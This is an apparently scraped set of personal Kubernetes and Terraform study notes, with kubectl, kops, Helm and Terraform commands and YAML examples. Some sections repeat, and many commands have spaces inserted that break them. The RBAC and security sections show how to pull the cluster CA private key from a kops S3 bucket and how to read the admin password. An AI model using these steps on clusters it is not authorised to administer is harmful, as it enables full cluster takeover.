slack_api_url : add your slack endpoint here route : group_by : [ alertname ] group_wait : 5s group_interval : 1m repeat_interval : 10m receiver : slack receivers : - name : slack slack_configs : - channel : #alerts icon_emoji : :bell: send_resolved : true text : !channel \\nsummary: {{ .CommonAnnotations.message }}\\n kubectl logs - n monitoring - namespace kube - prometheus kubectl logs - n monitoring - namespace kube - prometheus - c alertmanager remove existing secret for the config file and set a new secret ( alertmanager - kube - prometheus ) Requests and Limits Allow cluster manager to make intelligent decisions If memory limit reached - pod remain running, container restart If cpu limit reached - cpu clamped/throttled (will not be allowed to go over) kind : Pod spec : containers : - name : db resources : requests : memory : 64Mi cpu : 250m limits : memory : 128Mi cpu : 500m Metrics Enable metrics server: minikube addons list minikube addons enable metrics - server View stats: kubectl top pod kubectl top node Dashboard minikube dashboard Horizontal Pod Autoscaling (HPA) https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale/ https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale-walkthrough/ kubectl autoscale deployment example - deployment --cpu-percent 400 --min 1 --max 5 (relative to the request) kubectl get hpa kubectl describe hpa kubectl get hpa - o yaml behavior : scaleDown : policies : - type : Pods value : 4 periodSeconds : 60 - type : Percent value : 10 periodSeconds : 60 Readiness Probe / Liveness Probe https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/ readiness probes - to decide when the container is available for accepting traffic startup probe - with failureThreshold * periodSeconds long enough to cover the worse case startup time. deal with legacy applications that might require an additional startup time on their first initialization. liveness probes - to know when to restart a container (!live = restart) QoS and Evection https://kubernetes.io/docs/concepts/scheduling-eviction/kube-scheduler/ A scheduler watches for newly created Pods that have no Node assigned. For every Pod that the scheduler discovers, the scheduler becomes responsible for finding the best Node for that Pod to run on. QoS https://kubernetes.io/docs/tasks/configure-pod-container/quality-service-pod/ Guaranteed - Both Limit and Request defined Burstable - Only Request is defined BestEffort - No limit or request defined kubectl describe pod shows QoS class Evicted based on QoS Pod Priorities https://kubernetes.io/docs/concepts/configuration/pod-priority-preemption/ Priority indicates the importance of a Pod relative to other Pods. If a Pod cannot be scheduled, the scheduler tries to preempt (evict) lower priority Pods to make scheduling of the pending Pod possible. Only Pod - Priority is used in scheduling new pods During evection only QoS is considered first and then Pod - Priority RBAC kubectl get role kubectl get rolebinding Super-user Create OS user In k8s create a new namespace kubectl create ns playground kubectl config view . Copy API LB endpoint URL. X.509 API only accept requests signed by CA within the k8s cluster Create private-key: openssl genrsa - out private - key - username . key 2048 CSR: openssl req - new - key private - key - username . key - out req . csr --subj /CN=username/O=groupname aws s3 cp s3 : // storage - name / example . local / pki / private / ca / number . key kubernetes . key aws s3 cp s3 : // storage - name / example . local / pki / issued / ca / number . crt kubernetes . crt openssl x509 - req - in req . csr - CA kubernetes . crt - CAkey kubernetes . key - CAcreateserial - out username . crt - days 365 Install new certificate with: cp username . crt / home / . certs / cp private - key - username . key / home / . certs / cp kubernetes . crt / home / . certs / chown - R username : username / home / username / certs Define Role and RoleBinding (to bind role to user). New user do: kubectl config set - credential username --client-certificate=username.crt --client-key=private-key-username.key kubectl config set - cluster example . local --certificate-authority=kubernetes.crt kubectl config set - cluster example . local --server= api-lb_url Now new user can: kubectl config set - context mycontext --user my-user-name --cluster example.local https://kubernetes.io/docs/tasks/access-application-cluster/configure-access-multiple-clusters/ Check config with kubectl config view kubectl config use - context mycontext Now new user can kubectl get all Only allowed to access the namespace defined in role . If all-namespaces should be visible use ClusterRole and ClusterRoleBinding . Grant limited permission across cluster. Then use Role section to grant wider permissions on own-cluster. ServiceAccount in RoleBinding is used to grant access to one pod from another. ConfigMap Env variables are unmanageable and may get duplicated, leaving multiple places to change kubectl get cm kubectl describe cm Using config map valueFrom - configMapKeyRef Still duplicates When updating: Create a new version of the config-map Change the name referenced envFrom - configMapKeyRef all key value paired copied volumeMount and volume - configMap Each value of map becomes the file name Secrets Just prevents you from accidentals printing secret when doing kubectl get secrets No encryption RBAC can be used to deny access to secrets while giving access to configMaps kubectl get secrets kubectl get secret - n monitoring example - o yaml kubectl get secret - n monitoring example - o json kubectl delete secret - n monitoring example - o json kubectl create secret - n monitoring example --from-file=example.yaml Hot Reloading of ConfigMaps Spring Cloud Kubernetes Demo: https://www.youtube.com/watch?v=DiJ0Na8rWvc t=563s Ingress Controllers Accessing Service NodePort - Alow defining port and exposing. Port 30,000 and above only. ClusterIP - Internal access only LoadBalancer - Provided by the cloud provider will require separate LB for each service LB talk to Ingress Controller (ex Nginx) and IC talk to services kubectl get ingress kubectl describe ingress minikube addons list minikube addons enable ingress https://kubernetes.github.io/ingress-nginx/ Batch Jobs Pod by default always restarts (restart policy) Designed to run to completion DaemonSet All nodes run a copy of these pods StatefulSet Pods have predictable names Startup in sequence Client can address by name Example: Primary secondary situation - OpenFaaS Kubeless OpenWisk - GitLab TravisCI CircleCI - Promethius Fluentd OpenTracing Jeager - Istio LinkerD Consul - Teraform Helma Tools Kubernetes RBAC static Analysis visualisation tool: https://github.com/appvia/krane Security Validations For internal services, use ClusterIP service-type. (instead of NodePort ) In production all use ClusterIP ?? Are pods stateless? Are resource requests and limits defined properly. kubectl describe node minikube (cluster node). Allocatable and Capacity . If Java 10 is used of RAM is taken for Xmx by default ( - Xmx50m ) Readiness Probe / Liveness Probe defined properly kubectl config view --minify to get password of cluster admin user/password. usable to login to cluster API and all services deployed in the cluster including AlertManager : / api / v1 / namespaces / / api / v1 / namespaces / monitoring / services / api / v1 / namespaces / monitoring / services / alert - manager - operated : 9093 / proxy Prometheus: https://prometheus.io/docs/operating/security/ Audit RBAC configuration API groups are defined properly without using * Check ClusterRole for cluster wide permissions K8s API only accepts requests signed by CA within the k8s cluster Make sure cluster key is stored securely. kops : KOPS_STATE_STORE (s3 bucket) contains this. cluster_folder / pki / private / ca / number . key and pki / issued / ca / number . crt . aws s3 ls s3 : // storage - name / example . local / pki / private / ca / number . key aws s3 cp s3 : // storage - name / example . local / pki / private / ca / number . key kubernetes . key aws s3 cp s3 : // storage - name / example . local / pki / issued / ca / number . crt Cluster API Bring declarative k8s style APIs to cluster creation, configuration and management. New References https://github.com/Salaboy/orchestrating-cloud-events Understanding Kubernetes limits and requests by example: https://sysdig.com/blog/kubernetes-limits-requests/ Understanding Kubernetes pod evicted and scheduling problems: https://sysdig.com/blog/kubernetes-pod-evicted/ How to troubleshoot Kubernetes OOM and CPU Throttle: https://sysdig.com/blog/troubleshoot-kubernetes-oom/ Teraform Server provisioning Two steps: Initialize: terraform init Validate: terraform validate Plan: terraform plan Execute: teraform apply terraform console Resources are referenced as . : Example: aws_s3_bucket . my_s3_bucket Types: resource output variable lists maps provisioner connection terfaform . tfstate terfaform . tfstate . backup and .teraform must not be commited. Contains secrets in plain text. When state needs to be shared, store the state inside a Remote Backend . Create multiple resources: count = 2 \\n name= my_user_ ${ count . index } teraform show teraform fmt Assign to variable from environment variables: TF_VAR_ variable_name = value Best Practice: Create separate projects for resources that might have similar lifecycle. One application would have multiple projects. Best Practice: Use immutable servers - Once you provision a server and a change is required, just remove the old server and prosition a new one. Do not do tweeks. Make things dynamic: aws_default_vpc special resources that is not created / destroyed by Teraform. data_provider aws_subnet_ids to get list of subnets within the VPC aws_security_group data_provider aws_ami aws_ami_ids (most_recent: true) teraform graph - Graphwiz Storing state into S3 Create S3 bucket: lifecycle, versioning, server_side_encryption_configuration Create aws_dynamodb_table for locks: Attribute(LockID/S) terraform - backend \"s3\" - point to s3 and dynamodb.. name should be unique: application/project/type/envitronment application_name, project_name, environment can be variables Workspaces Track multiple environments teraform workspace show teraform workspace list teraform workspace new prod - env teraform workspace select prod - env Use ${ teraform . workspace } to add the workspace name to resources Modules Create teraform - modules dir and in it create modules for different resources Create dev prod folders. In these folders in main.tf add variable for environment. module user_module { source = ../../teraform-modules/users environment = dev } brew install terraform terraform -- version terraform version terraform init export AWS_ACCESS_KEY_ID =******* export AWS_SECRET_ACCESS_KEY =********* terraform plan terraform console terraform apply - refresh = false terraform plan - out iam . tfplan terraform apply iam.tfplan terraform apply - target = aws_iam_user . my_iam_user terraform destroy terraform validate terraform fmt terraform show export TF_VAR_iam_user_name_prefix = FROM_ENV_VARIABLE_IAM_PREFIX export TF_VAR_iam_user_name_prefix = FROM_ENV_VARIABLE_IAM_PREFIX terraform plan - refresh = false - var = iam_user_name_prefix=VALUE_FROM_COMMAND_LINE terraform apply - target = aws_default_vpc . default terraform apply - target = data . aws_subnet_ids . default_subnets terraform apply - target = data . aws_ami_ids . aws_linux_2_latest_ids terraform apply - target = data . aws_ami . aws_linux_2_latest terraform workspace show terraform workspace new prod - env terraform workspace select default terraform workspace list terraform workspace select prod - env Networking Flannel Calico Canel = Flannel + Network Policy (Calico) Weave CNI has less performance than VXLAN Azure Network CNI plugin IPSec Security Layer 0 - Kernel Check allowed syscalls and restrict Improve sandbox with gViser Kata container AWS Firecracker Keep kernel updated Layer 1 - The container Build Remove unnecessary tools Lightweight image Scan images Known sources Check integrity Run Epherminal containers for live debugging (never exec into running container) Hook into running container and watch for anomalies EBPF sysdig falko Layer 2 - The workloads Pod security context","title":"Kubernetes"},{"location":"devops/kubernetes/#quick-reference","text":"","title":"Quick Reference"},{"location":"devops/kubernetes/#minikube","text":"starts minikube minikube start stops the minikube virtual machine minikube stop completely wipe away the minikube image. Also you can delete all files in /.minikube and /.kube. minikube delete find out the required environment variables to connect to the docker daemon running in minikube minikube env find out the ip address of minikube. Needed for browser access. minikube ip","title":"Minikube"},{"location":"devops/kubernetes/#kubectl","text":"get help kubectl explain pods list all namespaces kubectl get ns list all objects that you\u2019ve created. Pods at first, later, ReplicaSets, Deployments and Services kubectl get all either creates or updates resources depending on the contents of the yaml file - kubectl apply \u2013 f yaml file apply all yaml files found in the current directory kubectl apply \u2013 f . gives full information about the specified pod kubectl describe pod name of pod gives full information about the specified service kubectl describe svc name of pod view pod logs kubectl logs { pod - name } Events kubectl get events --sort-by=.metadata.creationTimestamp execute the specified command in the pod\u2019s container. Doesn\u2019t work well in Cygwin. kubectl exec \u2013 it pod name command get all pods or services. Later in the course, replicasets and deployments. kubectl get ( pod | po | service | svc | rs | replicaset | deployment | deploy ) get all pods and their labels kubectl get po -- show - labels get all pods matching the specified name:value pair kubectl get po -- show - labels - l { name } = { value } delete the named pod. Can also delete svc, rs, deploy kubectl delete po pod name delete all pods (also svc, rs, deploy) kubectl delete po --all Monitor changes: --watch Diff: kubectl diff - f example . yaml CPU/Memory usage: kubectl top pods","title":"Kubectl"},{"location":"devops/kubernetes/#deployment-management","text":"create: kubectl create deployment example --image= image-name expose: kubectl expose deployment example --type=LoadBalancer scale: kubectl scale deployment example --replicas=3 get the status of the named deployment kubectl rollout status deploy name of deployment get the previous versions of the deployment kubectl rollout history deploy name of deployment go back one version in the deployment. Also optionally --to-revision=\\ revision_number> We recommend this is used only in stressful emergency situations! Your YAML will now be out of date with the live deployment! kubectl rollout undo deploy name of deployment Manual rollouts: kubectl rollout history deployment hello - world - rest - api kubectl set image deployment hello - world - rest - api hello - world - rest - api = in28min / hello - world - rest - api : 0 . 0 . 3 . RELEASE --record=true kubectl rollout undo deployment hello - world - rest - api --to-revision=1","title":"Deployment Management"},{"location":"devops/kubernetes/#volumes","text":"list PersistentVolumeClaims kubectl get pvc","title":"Volumes"},{"location":"devops/kubernetes/#kops","text":"Create cluster kops create cluster --zone eu-west-2a,eu-west-2b ${ NAME } Edit instance-group configuration kops edit ig Update cluster kops update cluster ${ NAME } --yes Validate cluster kops validate cluster Delete cluster kops delete cluster --name ${ NAME } --yes kubectl create deployment hello - world - rest - api --image=in28min/hello-world-rest-api:0.0.1.RELEASE kubectl expose deployment hello - world - rest - api --type=LoadBalancer --port=8080 kubectl scale deployment hello - world - rest - api --replicas=3 kubectl delete pod hello - world - rest - api - 58 ff5dd898 - 62 l9d kubectl autoscale deployment hello - world - rest - api --max=10 --cpu-percent=70 kubectl edit deployment hello - world - rest - api # minReadySeconds : 15 kubectl set image deployment hello - world - rest - api hello - world - rest - api = in28min / hello - world - rest - api : 0 . 0 . 2 . RELEASE gcloud container clusters get - credentials in28minutes - cluster --zone us-central1-a --project solid-course-258105 kubectl create deployment hello - world - rest - api --image=in28min/hello-world-rest-api:0.0.1.RELEASE kubectl expose deployment hello - world - rest - api --type=LoadBalancer --port=8080 kubectl set image deployment hello - world - rest - api hello - world - rest - api = DUMMY_IMAGE : TEST kubectl get events --sort-by=.metadata.creationTimestamp kubectl set image deployment hello - world - rest - api hello - world - rest - api = in28min / hello - world - rest - api : 0 . 0 . 2 . RELEASE kubectl get events --sort-by=.metadata.creationTimestamp kubectl get componentstatuses kubectl get pods --all-namespaces kubectl get events kubectl get pods kubectl get replicaset kubectl get deployment kubectl get service kubectl get pods - o wide kubectl explain pods kubectl get pods - o wide kubectl describe pod hello - world - rest - api - 58 ff5dd898 - 9 trh2 kubectl get replicasets kubectl get replicaset kubectl scale deployment hello - world - rest - api --replicas=3 kubectl get pods kubectl get replicaset kubectl get events kubectl get events --sort.by=.metadata.creationTimestamp kubectl get rs kubectl get rs - o wide kubectl set image deployment hello - world - rest - api hello - world - rest - api = DUMMY_IMAGE : TEST kubectl get rs - o wide kubectl get pods kubectl describe pod hello - world - rest - api - 85995 ddd5c - msjsm kubectl get events --sort-by=.metadata.creationTimestamp kubectl set image deployment hello - world - rest - api hello - world - rest - api = in28min / hello - world - rest - api : 0 . 0 . 2 . RELEASE kubectl get events --sort-by=.metadata.creationTimestamp kubectl get pods - o wide kubectl delete pod hello - world - rest - api - 67 c79fd44f - n6c7l kubectl get pods - o wide kubectl delete pod hello - world - rest - api - 67 c79fd44f - 8 bhdt kubectl get componentstatuses kubectl get pods --all-namespaces gcloud auth login kubectl version gcloud container clusters get - credentials in28minutes - cluster --zone us-central1-a --project solid-course-258105 kubectl logs hello - world - rest - api - 58 ff5dd898 - 6 ctr2 kubectl logs - f hello - world - rest - api - 58 ff5dd898 - 6 ctr2 kubectl get deployment hello - world - rest - api - o yaml kubectl get deployment hello - world - rest - api - o yaml deployment . yaml kubectl get service hello - world - rest - api - o yaml service . yaml kubectl apply - f deployment . yaml kubectl get all - o wide kubectl delete all - l app = hello - world - rest - api kubectl get svc --watch kubectl diff - f deployment . yaml kubectl delete deployment hello - world - rest - api kubectl get all - o wide kubectl delete replicaset . apps / hello - world - rest - api - 797 dd4b5dc kubectl get pods --all-namespaces kubectl get pods --all-namespaces -l app=hello-world-rest-api kubectl get services --all-namespaces kubectl get services --all-namespaces --sort-by=.spec.type kubectl get services --all-namespaces --sort-by=.metadata.name kubectl cluster - info kubectl cluster - info dump kubectl top node kubectl top pod kubectl get services kubectl get svc kubectl get ev kubectl get rs kubectl get ns kubectl get nodes kubectl get no kubectl get pods kubectl get po kubectl delete all - l app = hello - world - rest - api kubectl get all kubectl apply - f deployment . yaml kubectl apply - f .. / currency - conversion / deployment . yaml","title":"kops"},{"location":"devops/kubernetes/#yamls","text":"apiVersion : kind : metadata : spec :","title":"Yamls"},{"location":"devops/kubernetes/#pod","text":"The basic execution unit of a Kubernetes application--the smallest and simplest unit in the Kubernetes object model that you create or deploy. A Pod represents processes running on your cluster. Init container Run before the app containers are started. Init containers always run to completion. Each init container must complete successfully before the next one starts. If a Pod's init container fails, Kubernetes repeatedly restarts the Pod until the init container succeeds. However, if the Pod has a restartPolicy of Never, Kubernetes does not restart the Pod. https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/ https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.18/#pod-v1-core apiVersion : v1 kind : Pod metadata : name : pod-example spec : containers : - name : ubuntu image : ubuntu:trusty command : [ echo ] args : [ Hello World ]","title":"Pod"},{"location":"devops/kubernetes/#replicaset","text":"Maintain a stable set of replica Pods running at any given time. As such, it is often used to guarantee the availability of a specified number of identical Pods https://kubernetes.io/docs/concepts/workloads/controllers/replicaset/ https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.18/#replicaset-v1-apps apiVersion : apps/v1 kind : ReplicaSet metadata : # Unique key of the ReplicaSet instance name : replicaset-example spec : # 3 Pods should exist at all times. replicas : 3 selector : matchLabels : app : nginx template : metadata : labels : app : nginx spec : containers : # Run the nginx image - name : nginx image : nginx:1.14","title":"ReplicaSet"},{"location":"devops/kubernetes/#deployment","text":"Deployment provides declarative updates for Pods and ReplicaSets. You describe a desired state in a Deployment, and the Deployment Controller changes the actual state to the desired state at a controlled rate. https://kubernetes.io/docs/concepts/workloads/controllers/deployment/ https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.18/#deployment-v1-apps apiVersion : apps/v1 kind : Deployment metadata : # Unique key of the Deployment instance name : deployment-example spec : # 3 Pods should exist at all times. replicas : 3 selector : matchLabels : app : nginx template : metadata : labels : # Apply this label to pods and default # the Deployment label selector to this value app : nginx spec : containers : - name : nginx # Run this image image : nginx:1.14","title":"Deployment"},{"location":"devops/kubernetes/#daemonset","text":"A DaemonSet ensures that all (or some) Nodes run a copy of a Pod. As nodes are added to the cluster, Pods are added to them. As nodes are removed from the cluster, those Pods are garbage collected. running a cluster storage daemon on every node running a logs collection daemon on every node running a node monitoring daemon on every node https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/ https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.18/#daemonset-v1-apps apiVersion : apps/v1 kind : DaemonSet metadata : # Unique key of the DaemonSet instance name : daemonset-example spec : selector : matchLabels : app : daemonset-example template : metadata : labels : app : daemonset-example spec : containers : # This container is run once on each Node in the cluster - name : daemonset-example image : ubuntu:trusty command : - /bin/sh args : - -c # This script is run through `sh -c script ` - - while [ true ]; do echo DaemonSet running on $(hostname) ; sleep 10 ; done","title":"DaemonSet"},{"location":"devops/kubernetes/#service","text":"https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.18/#service-v1-core kind : Service apiVersion : v1 metadata : # Unique key of the Service instance name : service-example spec : ports : # Accept traffic sent to port 80 - name : http port : 80 targetPort : 80 selector : # Loadbalance traffic across Pods matching # this label selector app : nginx # Create an HA proxy in the cloud provider # with an External IP address - *Only supported # by some cloud providers* type : LoadBalancer","title":"Service"},{"location":"devops/kubernetes/#volume-and-volumemounts","text":"apiVersion : v1 kind : Pod metadata : name : pv-recycler namespace : default spec : restartPolicy : Never volumes : - name : vol hostPath : path : /any/path/it/will/be/replaced containers : - name : pv-recycler image : k8s.gcr.io/busybox command : [ /bin/sh , -c , test -e /scrub rm -rf /scrub/..?* /scrub/.[!.]* /scrub/* test -z \\ $(ls -A /scrub)\\ || exit 1 ] volumeMounts : - name : vol mountPath : /scrub","title":"Volume and VolumeMounts"},{"location":"devops/kubernetes/#persistentvolumeclaims","text":"apiVersion : v1 kind : PersistentVolumeClaim metadata : name : my-pvc spec : storageClassName : my-ssd-local-storage # Find matching storage class accessModes : - ReadWriteOnce # Find matching access mode resources : requests : storage : 8Gi # Find 8Gi of storage apiVersion : v1 kind : PersistentVolume metadata : name : my-local-storage spec : storageClassName : my-ssd-local-storage capacity : storage : 8Gi accessModes : - ReadWriteOnce hostPath : path : /mnt/somedir type : DirectoryOrCreate apiVersion : v1 kind : Pod metadata : name : mypod spec : containers : - name : myfrontend image : nginx volumeMounts : - mountPath : /var/www/html name : mypd volumes : - name : mypd persistentVolumeClaim : claimName : my-pvc","title":"PersistentVolumeClaims"},{"location":"devops/kubernetes/#storageclass-and-binding","text":"Change reclaim policy as required # What do want? apiVersion : v1 kind : PersistentVolumeClaim metadata : name : mongo-pvc spec : storageClassName : cloud-ssd accessModes : - ReadWriteOnce resources : requests : storage : 7Gi --- # How do we want it implemented apiVersion : storage.k8s.io/v1 kind : StorageClass metadata : name : cloud-ssd provisioner : kubernetes.io/aws-ebs parameters : type : gp2","title":"StorageClass and Binding"},{"location":"devops/kubernetes/#statefulset-set","text":"StatefulSet is the workload API object used to manage stateful applications. Stable, unique network identifiers. Stable, persistent storage. Ordered, graceful deployment and scaling. Ordered, automated rolling updates. Like a Deployment, a StatefulSet manages Pods that are based on an identical container spec. Unlike a Deployment, a StatefulSet maintains a sticky identity for each of their Pods. These pods are created from the same spec, but are not interchangeable: Each has a persistent identifier that it maintains across any rescheduling. https://kubernetes.io/docs/concepts/workloads/controllers/statefulset/","title":"StatefulSet Set"},{"location":"devops/kubernetes/#rbac","text":"https://kubernetes.io/docs/reference/access-authn-authz/rbac/ Kind - Role - ClusterRole to grant cluster-wide permissions. apiVersion : rbac.authorization.k8s.io/v1 kind : Role metadata : namespace : default name : pod-reader rules : - apiGroups : [ ] # indicates the core API group resources : [ pods ] verbs : [ get , watch , list ] apiVersion : rbac.authorization.k8s.io/v1 # This role binding allows jane to read pods in the default namespace. # You need to already have a Role named pod-reader in that namespace. kind : RoleBinding metadata : name : read-pods namespace : default subjects : # You can specify more than one subject - kind : User name : jane # name is case sensitive apiGroup : rbac.authorization.k8s.io roleRef : # roleRef specifies the binding to a Role / ClusterRole kind : Role #this must be Role or ClusterRole name : pod-reader # this must match the name of the Role or ClusterRole you wish to bind to apiGroup : rbac.authorization.k8s.io","title":"RBAC"},{"location":"devops/kubernetes/#configmap","text":"apiVersion : v1 kind : ConfigMap metadata : creationTimestamp : 2016-02-18T18:52:05Z name : game-config namespace : default resourceVersion : 516 uid : b4952dc3-d670-11e5-8cd0-68f728db1985 data : game.properties : | enemies=aliens lives=3 enemies.cheat=true enemies.cheat.level=noGoodRotten secret.code.passphrase=UUDDLRLRBABAS secret.code.allowed=true secret.code.lives=30 ui.properties : | color.good=purple color.bad=yellow allow.textmode=true how.nice.to.look=fairlyNice kubectl create configmap game - config - 2 --from-file=configure-pod-container/configmap/game.properties","title":"ConfigMap"},{"location":"devops/kubernetes/#secret","text":"apiVersion : v1 kind : Secret metadata : name : mysecret type : Opaque data : username : YWRtaW4= password : MWYyZDFlMmU2N2Rm apiVersion : v1 kind : Secret metadata : name : mysecret type : Opaque stringData : config.yaml : |- apiUrl: https://my.api.com/api/v1 username: {{username}} password: {{password}}","title":"Secret"},{"location":"devops/kubernetes/#ingress","text":"apiVersion : networking.k8s.io/v1beta1 kind : Ingress metadata : name : test-ingress annotations : nginx.ingress.kubernetes.io/rewrite-target : / spec : rules : - host : domain1.com http : paths : - path : /testpath pathType : Prefix backend : serviceName : test servicePort : 80 - host : domain2.com","title":"Ingress"},{"location":"devops/kubernetes/#job","text":"apiVersion : batch/v1 kind : Job metadata : name : pi spec : template : spec : containers : - name : pi image : perl command : [ perl , -Mbignum=bpi , -wle , print bpi(2000) ] restartPolicy : Never backoffLimit : 4","title":"Job"},{"location":"devops/kubernetes/#cronjob","text":"apiVersion : batch/v1beta1 kind : CronJob metadata : name : hello spec : schedule : */1 * * * * jobTemplate : spec : template : spec : containers : - name : hello image : busybox args : - /bin/sh - -c - date; echo Hello from the Kubernetes cluster restartPolicy : OnFailure","title":"CronJob"},{"location":"devops/kubernetes/#cloud-deployments","text":"Kops https://kops.sigs.k8s.io/ https://kops.sigs.k8s.io/getting_started/commands/","title":"Cloud Deployments"},{"location":"devops/kubernetes/#notes","text":"bretfisher Courses - Kubernetes Mastery: Hands-On Lessons From A Docker Captain: https://www.bretfisher.com/courses/ Threat matrix for Kubernetes - https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/ Pod Security Policies: https://kubernetes.io/docs/concepts/policy/pod-security-policy/ https://www.jaegertracing.io/docs/1.18/ Stay current in k8s Harden nodes Restrict network via RBAC Use namespaces and network policies Slim down images Logs - k8s audit / k8s rbac audit logs / Follows single responsibility concept Cluster Master Node - Manage Cluster API Server ( kube - apiserver ) Distributed Database ( etcd ) Scheduler ( kube - scheduler ) Controller Manager ( kube - controller - manager ) Worker Nodes - Run Applications Node Agent ( kubelet ) Interacts with kube - apiserver Networking Component ( kube - proxy ) Container Runtime (CRI-OCI/docker/rkt) PODS Service Pods are not visible outside k8s cluster K8s service is a long running object with IP address and stable fixed port usable to expose Pods out of k8s cluster Pod can have \"Label\" (key value pairs) Service can have \"Selector\" (key value pairs) Service will look for any matching key-value pairs when binding a service to a pod (selector / label) Service Types: NodePort Expose a port through the node Port needs to be greater than 30,000 Configure port and nodeport ClusterIP Internal service / not exposed to external traffic but exposed to internal nodes LoadBalancer Pod may die for many reasons: If pod take too many resources If node failed (all pods in that node die) ReplicaSets Add replica count into pod definition Change kind to ReplicaSet Nest pod definition in template spec attribute Remove pod names Add selector block (similar to services ) Deployment Automatic rolling update with rollbacks Networking Service Discovery Same Pod - can be accessed via localhost Kube-dns - Resolve service name to IP address Namespaces Partitioning resources into separate areas kubectl get ns get list of namespaces kubectl get all - n kube - system list resources from a namespace FQDN - database - database . mynamespace - database . mynamespace . svc . cluster . local (last part is appended by DNS) Check / etc / resolve . conf Expand memory: minikube stop minikube delete rm - rf ~/ . kube and rm - rf ~/ . minikube minikube start --memory 4096 Microservices changing one part is hard without affecting other complications of release coordination (big bang releases) shared global databases (integration databases) microservices as extreme form of modularity no direct communication in between interfaces for communication totally independent limit to one specific area of business function highly cohesive and loosely coupled database is split Domain-driven Design (Eric Evans) - Bounded Context https://github.com/DickChesterwood/k8s-fleetman need api gateway to expose backend functions (microservices) single point of entry to system https://microservices.io/patterns/apigateway.html Common Cluster Configurations: https://github.com/kubernetes/kubernetes/tree/master/cluster/addons ElasticStack + (LogStash / FluentD) Helm - Package management for k8s helm init helm version https://github.com/helm/charts helm repo update helm install stable / mysql --set mysqlPassword=example --name my-mysql Fix permissions: kubectl create serviceaccount --namespace kube-system tiller kubectl create clusterrolebinding tiller-cluster-rule --clusterrole = cluster-admin --serviceaccount = kube-system:tiller kubectl patch deploy --namespace kube-system tiller-deploy -p { spec :{ template :{ spec :{ serviceAccount : tiller }}}} Prometheus / Grafana (UI) helm install stable / prometheus - operator --name my-monitoring --namespace monitoring To see how this works kops edit cluster --name prometheus-oper-prometheus change type to LoadBalancer and access UI(9090/graph)) To get a full set of data from Prometheus: kops edit cluster --name ${ NAME } kubelet: anonymousAuth: false authenticationTokenWebhook: true authorizationMode: Webhook kops update cluster --yes kops rolling-update cluster --yes prometheus - operator failed : rpc error : code = Canceled https://github.com/helm/helm/issues/6130 helm del --purge monitoring helm install --name monitoring --namespace monitoring stable/prometheus-operator --set prometheusOperator.createCustomResource=false AlertManager over / api Dead man's switch - Constantly alerting. Stops if an alert is fired (or Prometheus is down) Slack integration Incoming web-hook Listen for Dead man's switch https://prometheus.io/docs/alerting/latest/configuration/ alertmanager . yaml global : slack_api_url : add your slack endpoint here route : group_by : [ alertname ] group_wait : 5s group_interval : 1m repeat_interval : 10m receiver : slack receivers : - name : slack slack_configs : - channel : #alerts icon_emoji : :bell: send_resolved : true text : !channel \\nsummary: {{ .CommonAnnotations.message }}\\n kubectl logs - n monitoring - namespace kube - prometheus kubectl logs - n monitoring - namespace kube - prometheus - c alertmanager remove existing secret for the config file and set a new secret ( alertmanager - kube - prometheus ) Requests and Limits Allow cluster manager to make intelligent decisions If memory limit reached - pod remain running, container restart If cpu limit reached - cpu clamped/throttled (will not be allowed to go over) kind : Pod spec : containers : - name : db resources : requests : memory : 64Mi cpu : 250m limits : memory : 128Mi cpu : 500m Metrics Enable metrics server: minikube addons list minikube addons enable metrics - server View stats: kubectl top pod kubectl top node Dashboard minikube dashboard Horizontal Pod Autoscaling (HPA) https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale/ https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale-walkthrough/ kubectl autoscale deployment example - deployment --cpu-percent 400 --min 1 --max 5 (relative to the request) kubectl get hpa kubectl describe hpa kubectl get hpa - o yaml behavior : scaleDown : policies : - type : Pods value : 4 periodSeconds : 60 - type : Percent value : 10 periodSeconds : 60 Readiness Probe / Liveness Probe https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/ readiness probes - to decide when the container is available for accepting traffic startup probe - with failureThreshold * periodSeconds long enough to cover the worse case startup time. deal with legacy applications that might require an additional startup time on their first initialization. liveness probes - to know when to restart a container (!live = restart) QoS and Evection https://kubernetes.io/docs/concepts/scheduling-eviction/kube-scheduler/ A scheduler watches for newly created Pods that have no Node assigned. For every Pod that the scheduler discovers, the scheduler becomes responsible for finding the best Node for that Pod to run on. QoS https://kubernetes.io/docs/tasks/configure-pod-container/quality-service-pod/ Guaranteed - Both Limit and Request defined Burstable - Only Request is defined BestEffort - No limit or request defined kubectl describe pod shows QoS class Evicted based on QoS Pod Priorities https://kubernetes.io/docs/concepts/configuration/pod-priority-preemption/ Priority indicates the importance of a Pod relative to other Pods. If a Pod cannot be scheduled, the scheduler tries to preempt (evict) lower priority Pods to make scheduling of the pending Pod possible. Only Pod - Priority is used in scheduling new pods During evection only QoS is considered first and then Pod - Priority RBAC kubectl get role kubectl get rolebinding Super-user Create OS user In k8s create a new namespace kubectl create ns playground kubectl config view . Copy API LB endpoint URL. X.509 API only accept requests signed by CA within the k8s cluster Create private-key: openssl genrsa - out private - key - username . key 2048 CSR: openssl req - new - key private - key - username . key - out req . csr --subj /CN=username/O=groupname aws s3 cp s3 : // storage - name / example . local / pki / private / ca / number . key kubernetes . key aws s3 cp s3 : // storage - name / example . local / pki / issued / ca / number . crt kubernetes . crt openssl x509 - req - in req . csr - CA kubernetes . crt - CAkey kubernetes . key - CAcreateserial - out username . crt - days 365 Install new certificate with: cp username . crt / home / . certs / cp private - key - username . key / home / . certs / cp kubernetes . crt / home / . certs / chown - R username : username / home / username / certs Define Role and RoleBinding (to bind role to user). New user do: kubectl config set - credential username --client-certificate=username.crt --client-key=private-key-username.key kubectl config set - cluster example . local --certificate-authority=kubernetes.crt kubectl config set - cluster example . local --server= api-lb_url Now new user can: kubectl config set - context mycontext --user my-user-name --cluster example.local https://kubernetes.io/docs/tasks/access-application-cluster/configure-access-multiple-clusters/ Check config with kubectl 